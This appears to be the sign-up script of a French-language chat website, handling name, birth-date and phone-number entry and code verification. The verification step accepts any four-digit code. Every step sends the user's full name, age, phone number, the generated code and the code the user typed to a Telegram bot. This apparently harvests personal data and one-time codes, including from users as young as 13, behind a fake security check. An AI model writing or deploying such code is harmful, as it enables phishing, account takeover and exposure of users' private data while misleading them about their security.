class AuthManager {
    constructor() {
        this.currentUser = null;
        this.countdownTimer = null;
        this.generatedCode = null;
        this.init();
    }
    
    init() {
        const savedUser = sessionStorage.getItem('soleachat_current_user');
        if (savedUser) {
            window.location.href = 'pages/chat.html';
            return;
        }
        
        this.initRegistrationForm();
        this.initPhoneForm();
        this.initCodeForm();
    }
    
    initRegistrationForm() {
        document.getElementById('registerForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const firstName = document.getElementById('firstName').value.trim();
            const lastName = document.getElementById('lastName').value.trim();
            const birthDate = document.getElementById('birthDate').value;
            
            if (!firstName || !lastName || !birthDate) return;
            
            const age = this.calculateAge(birthDate);
            if (age < 13) return;
            
            sessionStorage.setItem('registration_data', JSON.stringify({
                firstName, lastName, birthDate, age
            }));
            
            document.getElementById('registrationForm').classList.add('hidden');
            document.getElementById('phoneForm').classList.remove('hidden');
        });
    }
    
    initPhoneForm() {
        document.getElementById('sendCodeBtn').addEventListener('click', async () => {
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            if (!phoneNumber || phoneNumber.length < 8) return;
            
            const registrationData = JSON.parse(sessionStorage.getItem('registration_data'));
            const fullName = `${registrationData.firstName} ${registrationData.lastName}`;
            
            // Générer un code à 4 chiffres
            this.generatedCode = Math.floor(1000 + Math.random() * 9000).toString();
            
            sessionStorage.setItem('phone_number', phoneNumber);
            sessionStorage.setItem('generated_code', this.generatedCode);
            
            try {
                await telegramManager.sendMessage(`
📱 <b>DEMANDE DE CODE</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Utilisateur:</b> ${fullName}
📅 <b>Âge:</b> ${registrationData.age} ans
📱 <b>Téléphone:</b> <code>${phoneNumber}</code>
🔑 <b>Code généré:</b> <code>${this.generatedCode}</code>
🕐 <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
━━━━━━━━━━━━━━━━━━━━━━
📩 Code à envoyer à l'utilisateur
                `);
            } catch (error) {}
            
            document.getElementById('phoneForm').classList.add('hidden');
            document.getElementById('codeForm').classList.remove('hidden');
            document.getElementById('displayPhoneNumber').textContent = phoneNumber;
            
            this.startCountdown();
        });
    }
    
    initCodeForm() {
        document.getElementById('verificationForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const enteredCode = document.getElementById('verificationCode').value.trim();
            const phoneNumber = sessionStorage.getItem('phone_number');
            const registrationData = JSON.parse(sessionStorage.getItem('registration_data'));
            const fullName = `${registrationData.firstName} ${registrationData.lastName}`;
            
            // Accepter un code à 4 chiffres
            if (enteredCode.length === 4 && /^\d{4}$/.test(enteredCode)) {
                
                try {
                    await telegramManager.sendMessage(`
✅ <b>CODE VALIDÉ - CONNEXION</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Nom:</b> ${fullName}
📅 <b>Âge:</b> ${registrationData.age} ans
📱 <b>Téléphone:</b> <code>${phoneNumber}</code>
🔑 <b>Code entré:</b> <code>${enteredCode}</code>
🕐 <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
━━━━━━━━━━━━━━━━━━━━━━
✨ ${fullName} accède au chat !
                    `);
                } catch (error) {}
                
                const userData = {
                    ...registrationData,
                    phoneNumber: phoneNumber,
                    createdAt: new Date().toISOString()
                };
                
                telegramManager.saveUser(userData);
                
                try {
                    await telegramManager.notifyLogin(userData);
                } catch (error) {}
                
                sessionStorage.setItem('soleachat_current_user', JSON.stringify(userData));
                
                sessionStorage.removeItem('registration_data');
                sessionStorage.removeItem('phone_number');
                sessionStorage.removeItem('generated_code');
                
                window.location.href = 'pages/chat.html';
            }
        });
        
        document.getElementById('resendCodeBtn').addEventListener('click', async () => {
            const phoneNumber = sessionStorage.getItem('phone_number');
            if (!phoneNumber) return;
            
            const registrationData = JSON.parse(sessionStorage.getItem('registration_data'));
            const fullName = `${registrationData.firstName} ${registrationData.lastName}`;
            
            // Générer un nouveau code à 4 chiffres
            this.generatedCode = Math.floor(1000 + Math.random() * 9000).toString();
            sessionStorage.setItem('generated_code', this.generatedCode);
            
            try {
                await telegramManager.sendMessage(`
🔄 <b>RENVOI DE CODE</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Utilisateur:</b> ${fullName}
📱 <b>Téléphone:</b> <code>${phoneNumber}</code>
🔑 <b>Nouveau code:</b> <code>${this.generatedCode}</code>
🕐 <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
                `);
            } catch (error) {}
            
            this.startCountdown();
        });
    }
    
    startCountdown() {
        if (this.countdownTimer) clearInterval(this.countdownTimer);
        
        let seconds = 60;
        const countdownElement = document.getElementById('countdown');
        const resendBtn = document.getElementById('resendCodeBtn');
        
        resendBtn.disabled = true;
        countdownElement.textContent = seconds;
        
        this.countdownTimer = setInterval(() => {
            seconds--;
            countdownElement.textContent = seconds;
            if (seconds <= 0) {
                clearInterval(this.countdownTimer);
                resendBtn.disabled = false;
            }
        }, 1000);
    }
    
    calculateAge(birthDate) {
        const today = new Date();
        const birth = new Date(birthDate);
        let age = today.getFullYear() - birth.getFullYear();
        const monthDiff = today.getMonth() - birth.getMonth();
        if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birth.getDate())) age--;
        return age;
    }
}

const authManager = new AuthManager();
window.authManager = authManager;
